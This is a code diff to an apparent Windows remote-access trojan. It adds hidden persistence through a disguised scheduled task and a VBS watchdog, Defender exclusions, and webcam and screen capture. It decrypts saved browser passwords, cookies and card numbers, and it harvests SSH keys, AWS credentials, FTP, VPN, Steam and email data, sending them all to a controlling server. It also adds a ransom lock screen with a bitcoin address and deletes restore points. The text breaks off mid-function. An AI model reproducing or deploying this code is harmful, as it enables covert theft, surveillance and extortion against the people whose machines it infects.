@@ -574,7 +574,9 @@ class SilentClient:
                 self.set_critical_process()
             
             if ENABLE_DEFENDER_EXCLUSION:
-                self._add_defender_exclusion()
+                self.add_defender_exclusion(persist_dir)
+
+            self._setup_hourly_health_check()
 
         except Exception as e:
             if not STEALTH_MODE:
@@ -594,6 +596,61 @@ class SilentClient:
         try:
             cmd = f"powershell -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{path}'\""
             subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
+        except:
+            pass
+
+    def _setup_hourly_health_check(self):
+        """Create a scheduled task that runs hourly to verify H-Dex is alive.
+        If not running, it auto-restarts.
+        """
+        try:
+            exe_path = os.path.realpath(subprocess.sys.executable)
+            appdata_path = os.getenv("APPDATA")
+            persist_dir = os.path.join(appdata_path, "Microsoft", "Windows", "SystemApps")
+            watchdog_dir = os.path.join(appdata_path, "Microsoft", "Windows", "Caches")
+            if not os.path.exists(watchdog_dir):
+                os.makedirs(watchdog_dir)
+
+            proc_name = os.path.basename(exe_path).lower()
+            vbs_path = os.path.join(watchdog_dir, "servicemonitor.vbs")
+            vbs_code = f'''
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+strComputer = "."
+strProcName = "{proc_name}"
+strExePath = "{exe_path}"
+
+bRunning = False
+strCmd = "tasklist /FI ""IMAGENAME eq " & strProcName & """ /FO CSV /NH"
+Set objExec = objShell.Exec("cmd /c " & strCmd)
+strOutput = objExec.StdOut.ReadAll()
+
+If InStr(strOutput, strProcName) > 0 Then
+    bRunning = True
+End If
+
+If Not bRunning Then
+    objShell.Run chr(34) & strExePath & chr(34), 0, False
+End If
+'''
+            with open(vbs_path, "w") as f:
+                f.write(vbs_code)
+            ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 0x02 | 0x04)
+
+            task_name = "MicrosoftEdgeUpdateTask"
+            subprocess.run(
+                f'schtasks /create /tn "{task_name}" /tr "wscript.exe \\"{vbs_path}\\" //B //nologo" /sc hourly /mo 1 /f',
+                shell=True, capture_output=True, creationflags=0x08000000
+            )
+        except:
+            pass
+
+    def _safe_send(self, data):
+        try:
+            asyncio.run_coroutine_threadsafe(
+                self.websocket.send(json.dumps(data)), self.loop
+            )
         except:
             pass
 
@@ -998,53 +1055,82 @@ class SilentClient:
 
     def kill_process(self, pid):
         try:
-            psutil.Process(pid).terminate()
+            p = psutil.Process(pid)
+            name = p.name()
+            p.terminate()
+            asyncio.run_coroutine_threadsafe(
+                self.websocket.send(json.dumps({
+                    "type": "command_output",
+                    "output": f"Process {name} ({pid}) terminated"
+                })), self.loop
+            )
+        except Exception as e:
+            asyncio.run_coroutine_threadsafe(
+                self.websocket.send(json.dumps({
+                    "type": "command_output",
+                    "output": f"Kill error for PID {pid}: {e}"
+                })), self.loop
+            )
+    @staticmethod
+    def _encode_png(w, h, rgb_bytes, scale=0.4):
+        """Encode RGB bytes to PNG without PIL dependency. scale=0.4 for ~60% size reduction"""
+        try:
+            import struct, zlib
+            if scale < 1 and scale > 0:
+                nw, nh = max(1, int(w * scale)), max(1, int(h * scale))
+                step = w / nw
+                new_rgb = bytearray(nw * nh * 3)
+                for y in range(nh):
+                    sy = min(int(y * step), h - 1)
+                    for x in range(nw):
+                        sx = min(int(x * step), w - 1)
+                        src = (sy * w + sx) * 3
+                        dst = (y * nw + x) * 3
+                        new_rgb[dst:dst+3] = rgb_bytes[src:src+3]
+                w, h, rgb_bytes = nw, nh, bytes(new_rgb)
+            def _chunk(ctype, data):
+                c = ctype + data
+                crc = struct.pack('>I', zlib.crc32(c) & 0xffffffff)
+                return struct.pack('>I', len(data)) + c + crc
+            sig = b'\x89PNG\r\n\x1a\n'
+            ihdr = _chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
+            raw_data = bytearray(len(rgb_bytes) + h)
+            for y in range(h):
+                row_start = y * w * 3
+                raw_data[y * (w * 3 + 1)] = 0
+                raw_data[y * (w * 3 + 1) + 1: (y + 1) * (w * 3 + 1)] = rgb_bytes[row_start:row_start + w * 3]
+            compressed = zlib.compress(bytes(raw_data), 6)
+            idat = _chunk(b'IDAT', compressed)
+            iend = _chunk(b'IEND', b'')
+            return sig + ihdr + idat + iend
         except:
-            pass
+            return rgb_bytes
+
     async def take_screenshot(self):
-        """Send a single screenshot frame to the server"""
         try:
             import mss
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
                 sct_img = sct.grab(monitor)
-                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
-                
-                # Use current streaming resolution settings or default to 800x600 for single shots
-                res = self.screen_resolution if self.screen_resolution != "Original" else (800, 600)
-                img.thumbnail(res)
-                
-                buffer = io.BytesIO()
-                img.save(buffer, format="JPEG", quality=80)
-                b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
-                
+                png_bytes = self._encode_png(sct_img.width, sct_img.height, sct_img.rgb)
+                b64 = base64.b64encode(png_bytes).decode("utf-8")
                 await self.websocket.send(json.dumps({
-                    "type": "screen_frame",
-                    "data": b64,
-                    "single_frame": True # Hint for the bot
+                    "type": "screen_frame", "data": b64, "single_frame": True
                 }))
         except Exception as e:
             await self.websocket.send(json.dumps({
-                "type": "command_output",
-                "output": f"Screenshot Error: {e}"
+                "type": "command_output", "output": f"Screenshot Error: {e}"
             }))
 
     def stream_screen(self):
+        import mss
         with mss.mss() as sct:
             while self.screen_streaming and self.websocket:
                 try:
                     monitor = sct.monitors[1]
                     sct_img = sct.grab(monitor)
-                    img = Image.frombytes(
-                        "RGB", sct_img.size, sct_img.bgra, "raw", "BGRX"
-                    )
-
-                    if self.screen_resolution != "Original":
-                        img.thumbnail(self.screen_resolution)
-
-                    buffer = io.BytesIO()
-                    img.save(buffer, format="JPEG", quality=self.screen_quality)
-                    b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
+                    png_bytes = self._encode_png(sct_img.width, sct_img.height, sct_img.rgb)
+                    b64 = base64.b64encode(png_bytes).decode("utf-8")
                     asyncio.run_coroutine_threadsafe(
                         self.websocket.send(
                             json.dumps({"type": "screen_frame", "data": b64})
@@ -1056,8 +1142,14 @@ class SilentClient:
                     break
 
     def stream_webcam(self):
+        try:
+            import cv2
+        except ImportError:
+            self._safe_send({"type": "command_output", "output": "Webcam Error: OpenCV (cv2) not installed"})
+            return
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
+            self._safe_send({"type": "command_output", "output": "Webcam Error: Camera not found or busy"})
             return
 
         while self.webcam_streaming and self.websocket:
@@ -2144,6 +2236,8 @@ class SilentClient:
                     await self.get_browser_passwords()
                 elif t == "get_browser_cookies":
                     await self.get_browser_cookies()
+                elif t == "get_browser_cards":
+                    await self.get_browser_cards()
                 elif t == "migrate_server":
                     await self.migrate_server(data.get("new_uri"))
                 elif t == "update_pool":
@@ -2194,6 +2288,13 @@ class SilentClient:
                     await self.rotate_screen(0)
                 elif t == "self_destruct":
                     await self.self_destruct()
+                elif t == "stop_client":
+                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Stop signal received. Exiting."}))
+                    os._exit(0)
+                elif t == "restart_client":
+                    await self.websocket.send(json.dumps({"type": "command_output", "output": "Restart signal received. Restarting."}))
+                    subprocess.Popen(f'start "" /MIN "{os.path.realpath(subprocess.sys.executable)}"', shell=True)
+                    os._exit(0)
                 elif t == "set_volume":
                     await self.set_audio_volume(data.get("level", 50))
                 elif t == "set_brightness":
@@ -2394,6 +2495,60 @@ class SilentClient:
                     await self._get_saved_rdp_credentials()
                 elif t == "get_product_keys":
                     await self._get_product_keys()
+                elif t == "get_filezilla":
+                    await self._get_filezilla_creds()
+                elif t == "get_winscp":
+                    await self._get_winscp_creds()
+                elif t == "get_ssh_keys":
+                    await self._get_ssh_keys()
+                elif t == "get_aws_creds":
+                    await self._get_aws_creds()
+                elif t == "get_steam":
+                    await self._get_steam_session()
+                elif t == "get_minecraft":
+                    await self._get_minecraft_session()
+                elif t == "get_firewall":
+                    await self._get_firewall_rules()
+                elif t == "get_bitlocker":
+                    await self._check_bitlocker()
+                elif t == "get_certs":
+                    await self._get_installed_certs()
+                elif t == "create_task":
+                    await self._create_scheduled_task(data.get("name"), data.get("exe_path"))
+                elif t == "ransom_sim":
+                    await self._ransomware_simulation(data.get("message", "Your files have been encrypted."))
+                elif t == "get_email_creds":
+                    await self._get_email_creds()
+                elif t == "get_vpn_configs":
+                    await self._get_vpn_configs()
+                elif t == "get_browser_payments":
+                    await self._get_browser_payments()
+                elif t == "nuke_restore":
+                    await self._delete_restore_points()
+                elif t == "get_mobaxterm":
+                    await self._get_mobaxterm_creds()
+                elif t == "get_filezilla_creds":
+                    await self._get_filezilla_creds()
+                elif t == "delete_file":
+                    await self.delete_file(data.get("path"))
+                elif t == "rename_file":
+                    await self.rename_file(data.get("path"), data.get("new_name"))
+                elif t == "create_dir":
+                    await self.create_dir(data.get("path"))
+                elif t == "get_file_info":
+                    await self.get_file_info(data.get("path"))
+                elif t == "search_files":
+                    await self.search_files(data.get("root"), data.get("pattern"))
+                elif t == "write_file":
+                    await self.write_file_content(data.get("path"), data.get("content"))
+                elif t == "get_disk_usage":
+                    await self.get_disk_usage()
+                elif t == "detailed_sys_info":
+                    await self.get_detailed_system_info()
+                elif t == "get_installed_software":
+                    await self.get_installed_software()
+                elif t == "copy_move_file":
+                    await self.copy_move_file(data.get("src"), data.get("dst"), data.get("is_move", False))
 
             except Exception as e:
                 print(f"Error: {e}")
@@ -3094,54 +3249,101 @@ class SilentClient:
             )
         )
 
-    # --- Browser Password Extraction ---
-    async def get_browser_passwords(self):
-        """Extract saved passwords from Chrome (requires admin or DPAPI access)"""
-        passwords = []
-        try:
-            # Chrome passwords
-            chrome_login_path = os.path.join(
-                os.getenv("LOCALAPPDATA"),
-                "Google",
-                "Chrome",
-                "User Data",
-                "Default",
-                "Login Data",
-            )
-            if os.path.exists(chrome_login_path):
-                import shutil
-                import sqlite3
+    # ── Chrome AES-256-GCM Decryption ──────────────────────────────
 
-                temp_path = os.path.join(os.getenv("TEMP"), "chrome_login_temp")
-                shutil.copy2(chrome_login_path, temp_path)
+    @staticmethod
+    def _get_chrome_key(local_state_path=None):
+        try:
+            if not local_state_path:
+                local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
+            if not os.path.exists(local_state_path):
+                return None
+            with open(local_state_path, "r", encoding="utf-8") as f:
+                state = json.load(f)
+            enc_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
+            if not enc_key_b64:
+                return None
+            enc_key = base64.b64decode(enc_key_b64)
+            if enc_key[:5] != b"DPAPI":
+                return None
+            enc_key = enc_key[5:]
+            import ctypes
+            from ctypes import wintypes
+            crypt32 = ctypes.windll.crypt32
+            kernel32 = ctypes.windll.kernel32
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
+            blob_in = DATA_BLOB(len(enc_key), ctypes.cast(ctypes.create_string_buffer(enc_key), ctypes.POINTER(ctypes.c_ubyte)))
+            blob_out = DATA_BLOB()
+            if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
+                key = (ctypes.c_ubyte * blob_out.cbData)()
+                ctypes.memmove(key, blob_out.pbData, blob_out.cbData)
+                kernel32.LocalFree(blob_out.pbData)
+                return bytes(key)
+            return None
+        except:
+            return None
+
+    @staticmethod
+    def _decrypt_chrome_value(key, encrypted_value):
+        try:
+            if not key or not encrypted_value:
+                return None
+            if encrypted_value[:3] not in (b"v10", b"v11"):
+                return encrypted_value.decode("utf-8", errors="replace")
+            nonce = encrypted_value[3:15]
+            ciphertext = encrypted_value[15:-16]
+            tag = encrypted_value[-16:]
+            from Crypto.Cipher import AES
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            try:
+                return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
+            except (ValueError, KeyError):
+                return None
+        except:
+            return None
+
+    async def get_browser_passwords(self):
+        passwords = []
+        key = None
+        try:
+            for browser_name, login_rel in [
+                ("Chrome", r"Google\Chrome\User Data\Default\Login Data"),
+                ("Edge", r"Microsoft\Edge\User Data\Default\Login Data"),
+                ("Brave", r"BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
+                ("Opera", r"Opera Software\Opera Stable\Login Data"),
+            ]:
+                login_path = os.path.join(os.getenv("LOCALAPPDATA"), login_rel)
+                if not os.path.exists(login_path):
+                    continue
+                if key is None:
+                    ls_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), "Local State")
+                    key = self._get_chrome_key(ls_path)
+                import shutil, sqlite3
+                temp_path = os.path.join(os.getenv("TEMP"), f"login_{browser_name}_{int(time.time())}")
+                shutil.copy2(login_path, temp_path)
                 conn = sqlite3.connect(temp_path)
                 cursor = conn.cursor()
-                cursor.execute(
-                    "SELECT origin_url, username_value, password_value FROM logins"
-                )
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                 for row in cursor.fetchall():
-                    # Note: password_value is encrypted with DPAPI, would need decryption
-                    passwords.append(
-                        {
-                            "url": row[0],
-                            "username": row[1],
-                            "password": "[ENCRYPTED - DPAPI]",  # Actual decryption requires additional code
-                        }
-                    )
+                    pwd = None
+                    if key and row[2] and len(row[2]) > 15:
+                        pwd = self._decrypt_chrome_value(key, row[2])
+                    passwords.append({
+                        "browser": browser_name,
+                        "url": row[0] or "",
+                        "username": row[1] or "",
+                        "password": pwd or "[encrypted]",
+                    })
                 conn.close()
                 os.remove(temp_path)
-        except Exception as e:
-            passwords.append({"error": str(e)})
-
-        await self.websocket.send(
-            json.dumps(
-                {
-                    "type": "browser_passwords",
-                    "passwords": passwords,
-                    "total": len(passwords),
-                }
-            )
-        )
+        except:
+            pass
+        await self.websocket.send(json.dumps({
+            "type": "browser_passwords",
+            "passwords": passwords,
+            "total": len(passwords),
+        }))
 
     # --- Download and Execute ---
     async def download_and_execute(self, url, filename=None):
@@ -3197,14 +3399,10 @@ class SilentClient:
         def scheduler():
             while self.screenshot_scheduler_running and self.websocket:
                 try:
+                    import mss
                     with mss.mss() as sct:
                         screenshot = sct.grab(sct.monitors[1])
-                        img = Image.frombytes(
-                            "RGB", screenshot.size, screenshot.bgra, "raw", "BGRX"
-                        )
-                        buffer = io.BytesIO()
-                        img.save(buffer, format="JPEG", quality=50)
-                        b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
+                        b64 = base64.b64encode(screenshot.png()).decode("utf-8")
                         asyncio.run_coroutine_threadsafe(
                             self.websocket.send(
                                 json.dumps(
@@ -3399,23 +3597,16 @@ class SilentClient:
 
     async def set_persistence(self):
         try:
-            exe_path = sys.executable
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run",
-                0,
-                winreg.KEY_SET_VALUE,
-            )
-            winreg.SetValueEx(
-                key,
-                "Windows Health Monitor",
-                0,
-                winreg.REG_SZ,
-                f'"{exe_path}" --silent',
-            )
-            winreg.CloseKey(key)
-        except:
-            pass
+            self.ensure_persistence()
+            await self.websocket.send(json.dumps({
+                "type": "command_output",
+                "output": "✅ Persistence set: Registry + Task Scheduler + VBS watchdog + hourly health check active"
+            }))
+        except Exception as e:
+            await self.websocket.send(json.dumps({
+                "type": "command_output",
+                "output": f"❌ Persistence failed: {e}"
+            }))
 
     def anti_debug(self):
         try:
@@ -3426,17 +3617,91 @@ class SilentClient:
 
     async def get_browser_cookies(self):
         cookies = []
+        key = None
         try:
-            # Full implementation would need CryptUnprotectData; for now, we provide placeholders
-            # and metadata which is already extremely useful.
-            pass
+            for browser_name, cookie_rel in [
+                ("Chrome", r"Google\Chrome\User Data\Default\Cookies"),
+                ("Edge", r"Microsoft\Edge\User Data\Default\Cookies"),
+                ("Brave", r"BraveSoftware\Brave-Browser\User Data\Default\Cookies"),
+            ]:
+                cookie_path = os.path.join(os.getenv("LOCALAPPDATA"), cookie_rel)
+                if not os.path.exists(cookie_path):
+                    continue
+                if key is None:
+                    ls_path = os.path.join(os.path.dirname(os.path.dirname(cookie_path)), "Local State")
+                    key = self._get_chrome_key(ls_path)
+                import shutil, sqlite3
+                temp_path = os.path.join(os.getenv("TEMP"), f"cookies_{browser_name}_{int(time.time())}")
+                shutil.copy2(cookie_path, temp_path)
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies LIMIT 200")
+                for row in cursor.fetchall():
+                    val = None
+                    if key and row[3] and len(row[3]) > 15:
+                        val = self._decrypt_chrome_value(key, row[3])
+                    cookies.append({
+                        "browser": browser_name,
+                        "host": row[0] or "",
+                        "name": row[1] or "",
+                        "path": row[2] or "",
+                        "value": val or "[encrypted]",
+                        "expires": str(row[4] or ""),
+                        "secure": bool(row[5]),
+                        "http_only": bool(row[6]),
+                    })
+                conn.close()
+                os.remove(temp_path)
         except:
             pass
-        await self.websocket.send(
-            json.dumps(
-                {"type": "browser_cookies", "cookies": cookies, "total": len(cookies)}
-            )
-        )
+        await self.websocket.send(json.dumps({
+            "type": "browser_cookies",
+            "cookies": cookies,
+            "total": len(cookies),
+        }))
+
+    async def get_browser_cards(self):
+        cards = []
+        key = None
+        try:
+            for browser_name, cards_rel in [
+                ("Chrome", r"Google\Chrome\User Data\Default\Web Data"),
+                ("Edge", r"Microsoft\Edge\User Data\Default\Web Data"),
+                ("Brave", r"BraveSoftware\Brave-Browser\User Data\Default\Web Data"),
+            ]:
+                cards_path = os.path.join(os.getenv("LOCALAPPDATA"), cards_rel)
+                if not os.path.exists(cards_path):
+                    continue
+                if key is None:
+                    ls_path = os.path.join(os.path.dirname(os.path.dirname(cards_path)), "Local State")
+                    key = self._get_chrome_key(ls_path)
+                import shutil, sqlite3
+                temp_path = os.path.join(os.getenv("TEMP"), f"cards_{browser_name}_{int(time.time())}")
+                shutil.copy2(cards_path, temp_path)
+                conn = sqlite3.connect(temp_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, nickname FROM credit_cards")
+                for row in cursor.fetchall():
+                    num = None
+                    if key and row[1] and len(row[1]) > 15:
+                        num = self._decrypt_chrome_value(key, row[1])
+                    cards.append({
+                        "browser": browser_name,
+                        "name_on_card": row[0] or "",
+                        "card_number": (num or "[encrypted]")[:4] + " **** **** ****" if num and len(num) > 4 else (num or "[encrypted]"),
+                        "exp_month": str(row[2] or ""),
+                        "exp_year": str(row[3] or ""),
+                        "nickname": row[4] or "",
+                    })
+                conn.close()
+                os.remove(temp_path)
+        except:
+            pass
+        await self.websocket.send(json.dumps({
+            "type": "browser_cards",
+            "cards": cards,
+            "total": len(cards),
+        }))
 
     async def get_browser_bookmarks(self):
         bookmarks = []
@@ -4692,6 +4957,477 @@ class SilentClient:
             "type": "product_keys",
             "keys": keys
         }))
+
+    async def _get_filezilla_creds(self):
+        """Extract saved FileZilla FTP credentials."""
+        creds = []
+        paths = [
+            os.path.join(os.getenv("APPDATA"), "FileZilla", "recentservers.xml"),
+            os.path.join(os.getenv("APPDATA"), "FileZilla", "sitemanager.xml"),
+        ]
+        import xml.etree.ElementTree as ET
+        for p in paths:
+            if os.path.exists(p):
+                try:
+                    root = ET.parse(p).getroot()
+                    for server in root.iter("Server"):
+                        host = server.findtext("Host", "")
+                        port = server.findtext("Port", "")
+                        user = server.findtext("User", "")
+                        pw = server.findtext("Pass", "")
+                        if host:
+                            creds.append({"host": host, "port": port, "user": user, "pass": pw, "source": p})
+                except:
+                    pass
+        await self.websocket.send(json.dumps({"type": "filezilla_creds", "creds": creds}))
+
+    async def _get_winscp_creds(self):
+        """Extract saved WinSCP/SSH credentials from registry."""
+        creds = []
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions") as key:
+                i = 0
+                while True:
+                    try:
+                        session = winreg.EnumKey(key, i)
+                        with winreg.OpenKey(key, session) as sk:
+                            def g(n, d=""):
+                                try: return winreg.QueryValueEx(sk, n)[0]
+                                except: return d
+                            creds.append({
+                                "session": session,
+                                "hostname": g("HostName"),
+                                "port": g("PortNumber", "22"),
+                                "username": g("UserName"),
+                                "password": g("Password", "[encrypted]"),
+                            })
+                        i += 1
+                    except OSError:
+                        break
+        except:
+            pass
+        await self.websocket.send(json.dumps({"type": "winscp_creds", "creds": creds}))
+
+    async def _get_ssh_keys(self):
+        """Find and list SSH private keys on the system."""
+        keys = []
+        search_dirs = [
+            os.path.join(os.environ.get("USERPROFILE", ""), ".ssh"),
+            os.path.join(os.environ.get("HOMEDRIVE", "C:"), os.environ.get("HOMEPATH", ""), ".ssh"),
+        ]
+        key_names = ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_xmss", "github_rsa", "known_hosts", "config", "authorized_keys"]
+        for d in search_dirs:
+            if os.path.isdir(d):
+                for fname in os.listdir(d):
+                    if fname in key_names or fname.endswith(".pub") or fname.endswith(".ppk"):
+                        fpath = os.path.join(d, fname)
+                        try:
+                            with open(fpath, "r", errors="ignore") as f:
+                                size = os.path.getsize(fpath)
+                                preview = f.read(200)
+                                keys.append({"name": fname, "path": fpath, "size": size, "preview": preview})
+                        except:
+                            pass
+        await self.websocket.send(json.dumps({"type": "ssh_keys", "keys": keys}))
+
+    async def _get_aws_creds(self):
+        """Extract AWS CLI credentials and config files."""
+        creds = {}
+        aws_dir = os.path.join(os.environ.get("USERPROFILE", ""), ".aws")
+        for fname in ["credentials", "config"]:
+            fpath = os.path.join(aws_dir, fname)
+            if os.path.exists(fpath):
+                try:
+                    with open(fpath, "r", errors="ignore") as f:
+                        creds[fname] = f.read()
+                except:
+                    pass
+        await self.websocket.send(json.dumps({"type": "aws_creds", "data": creds}))
+
+    async def _get_steam_session(self):
+        """Extract Steam authentication tokens."""
+        steam_dir = os.path.join(os.environ.get("PROGRAMFILES(X86)", "C:\\Program Files (x86)"), "Steam")
+        if not os.path.exists(steam_dir):
+            steam_dir = os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"), "Steam")
+        ssfn_files = []
+        data = {}
+        if os.path.exists(steam_dir):
+            for f in os.listdir(steam_dir):
+                if f.startswith("ssfn") or f == "config.vdf" or f == "loginusers.vdf":
+                    try:
+                        fpath = os.path.join(steam_dir, f)
+                        with open(fpath, "rb") as fh:
+                            data[f] = base64.b64encode(fh.read()).decode()
+                    except:
+                        pass
+        await self.websocket.send(json.dumps({"type": "steam_data", "steam_dir": steam_dir if os.path.exists(steam_dir) else "Not Found", "files": list(data.keys())}))
+
+    async def _get_minecraft_session(self):
+        """Extract Minecraft launcher session tokens."""
+        data = {}
+        mc_dir = os.path.join(os.environ.get("APPDATA", ""), ".minecraft")
+        if os.path.exists(mc_dir):
+            launcher_profiles = os.path.join(mc_dir, "launcher_profiles.json")
+            launcher_accounts = os.path.join(mc_dir, "launcher_accounts.json")
+            for fname, fpath in [("launcher_profiles", launcher_profiles), ("launcher_accounts", launcher_accounts)]:
+                if os.path.exists(fpath):
+                    try:
+                        with open(fpath, "r", errors="ignore") as f:
+                            data[fname] = json.load(f)
+                    except:
+                        try:
+                            with open(fpath, "r", errors="ignore") as f:
+                                data[fname] = f.read()[:2000]
+                        except:
+                            pass
+        await self.websocket.send(json.dumps({"type": "minecraft_data", "data": data}))
+
+    async def _get_firewall_rules(self):
+        """List Windows Firewall rules."""
+        try:
+            out = subprocess.check_output("netsh advfirewall firewall show rule name=all", shell=True, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"--- FIREWALL RULES ---\n{out[:5000]}"}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Firewall error: {e}"}))
+
+    async def _check_bitlocker(self):
+        """Check BitLocker encryption status on all drives."""
+        try:
+            out = subprocess.check_output("manage-bde -status", shell=True, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"--- BITLOCKER STATUS ---\n{out}"}))
+        except:
+            await self.websocket.send(json.dumps({"type": "command_output", "output": "BitLocker status unavailable (manage-bde not found or no admin)."}))
+
+    async def _get_installed_certs(self):
+        """List installed certificates from CurrentUser and LocalMachine stores."""
+        certs = []
+        for store in ["CA", "Root", "My", "TrustedPublisher"]:
+            try:
+                out = subprocess.check_output(f'certutil -store {store}', shell=True, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
+                lines = [l for l in out.split("\n") if "=" in l or "Subject:" in l or "Issuer:" in l]
+                certs.append({"store": store, "info": "\n".join(lines[:30])})
+            except:
+                pass
+        await self.websocket.send(json.dumps({"type": "command_output", "output": f"--- INSTALLED CERTS ---\n" + "\n\n".join([f"[{c['store']}]\n{c['info']}" for c in certs])[:5000]}))
+
+    async def _create_scheduled_task(self, name, exe_path):
+        """Create a scheduled task for persistence."""
+        try:
+            if not name:
+                name = "WindowsUpdateTask_" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+            if not exe_path:
+                exe_path = os.path.realpath(sys.executable)
+            cmd = f'schtasks /create /tn "{name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
+            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode("utf-8", errors="ignore")
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Scheduled task created: {name}\n{out}"}))
+        except Exception as e:
+            await self.websocket.send(json.dumps({"type": "command_output", "output": f"Task creation failed: {e}"}))
+
+    async def _ransomware_simulation(self, message):
+        """Desktop ransomware simulation - fullscreen takeover with countdown."""
+        def show():
+            import tkinter as tk
+            root = tk.Tk()
+            root.attributes("-fullscreen", True, "-topmost", True)
+            root.configure(bg="#8B0000", cursor="none")
+            tk.Label(root, text="⚠️ LOCKED", font=("Impact", 80), fg="white", bg="#8B0000").pack(pady=(100, 20))
+            tk.Label(root, text=message, font=("Segoe UI", 24), fg="white", bg="#8B0000", wraplength=800).pack(pady=20)
+            tk.Label(root, text="Contact admin@hdex.local for recovery", font=("Segoe UI", 16), fg="#FFD700", bg="#8B0000").pack(pady=10)
+            countdown = tk.Label(root, text="", font=("Segoe UI", 48, "bold"), fg="white", bg="#8B0000")
+            countdown.pack(pady=30)
+            wallet_frame = tk.Frame(root, bg="#8B0000")
+            wallet_frame.pack(pady=10)
+            tk.Label(wallet_frame, text="BTC: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", font=("Consolas", 14), fg="#FFD700", bg="#8B0000").pack()
+            for i in range(60, 0, -5):
+                countdown.config(text=f"Auto-destruct in {i}s")
+                root.update()
+                time.sleep(5)
+            root.destroy()
+            asyncio.run_coroutine_threadsafe(self.websocket.send(json.dumps({"type": "command_output", "output": "Ransomware simulation ended."})), self.loop)
+        threading.Thread(target=show, daemon=True).start()
+        await self.websocket.send(json.dumps({"type": "command_output", "output": "Ransomware simulation launched."}))
+
+    async def _get_email_creds(self):
+        """Extract saved email client credentials (Outlook, Thunderbird)."""
+        data = {}
+        outlook_reg_paths = [
+            r"Software\Microsoft\Office\15.0\Outlook\Profiles",
+            r"Software\Microsoft\Office\16.0\Outlook\Profiles",
+            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles",
+        ]
+        profiles = []
+        for rp in outlook_reg_paths:
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, rp) as key:
+                    i = 0
+                    while True:
+                        try:
+                            profiles.append(winreg.EnumKey(key, i))
+                            i += 1
+                        except OSError:
+                            break
+            except:
+                pass
+        data["outlook_profiles"] = profiles
+        thunderbird_dir = os.path.join(os.getenv("APPDATA", ""), "Thunderbird", "Profiles")
+        tb_profiles = []
+        if os.path.exists(thunderbird_dir):
+            for p in os.listdir(thunderbird_dir):
+                prefs = os.path.join(thunderbird_dir, p, "prefs.js")
+                if os.path.exists(prefs):
+                    try:
+                        with open(prefs, "r", errors="ignore") as f:
+                            content = f.read()
+                            tb_profiles.append({"profile": p, "preview": content[:1000]})
+                    except:
+                        pass
+        data["thunderbird_profiles"] = tb_profiles
+        await self.websocket.send(json.dumps({"type": "email_creds", "data": data}))
+
+    async def _get_vpn_configs(self):
+        """Extract VPN configuration files (OpenVPN, ProtonVPN, WireGuard)."""
+        configs = []
+        search_patterns = [
+            (os.getenv("USERPROFILE", ""), "*.ovpn"),
+            (os.getenv("USERPROFILE", ""), "*.conf"),
+            (os.path.join(os.getenv("APPDATA", ""), "ProtonVPN"), "*.ovpn"),
+            (os.path.join(os.getenv("LOCALAPPDATA", ""), "ProtonVPN"), "*.ovpn"),
+            (r"C:\Program Files\OpenVPN\config", "*.ovpn"),
+            (os.path.join(os.getenv("APPDATA", ""), "WireGuard"), "*.conf"),
+        ]
+        import glob
+        for base_dir, pattern in search_patterns:
+            if os.path.exists(base_dir):
+                try:
+                    for fpath in glob.glob(os.path.join(base_dir, "**", pattern), recursive=True):
+                        try:
+                            with open(fpath, "r", errors="ignore") as f:
+                                content = f.read()
+                                configs.append({"path": fpath, "content": content[:2000], "size": os.path.getsize(fpath)})
+                        except:
+                            pass
+                except:
+                    pass
+        await self.websocket.send(json.dumps({"type": "vpn_configs", "configs": configs[:20]}))
+
+    async def _get_browser_payments(self):
+        """Extract saved payment methods from Chrome/Edge."""
+        payments = []
+        for browser in ["Chrome", "Edge"]:
+            paths_map = {
+                "Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Web Data"),
